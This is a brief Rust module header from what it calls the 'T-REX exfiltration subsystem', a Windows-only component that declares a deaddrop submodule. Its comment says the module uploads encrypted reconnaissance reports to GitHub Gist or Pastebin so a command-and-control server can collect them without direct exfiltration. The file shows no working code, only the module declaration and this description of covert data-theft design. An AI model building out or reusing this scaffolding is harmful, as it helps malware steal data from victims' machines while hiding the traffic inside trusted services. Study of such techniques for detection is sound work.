//! T-REX exfiltration subsystem.
//!
//! Dead-drop resolver: upload encrypted recon reports to trusted third-party
//! services (GitHub Gist, Pastebin) for C2 retrieval without direct exfiltration.

#![cfg(target_os = "windows")]

pub mod deaddrop;
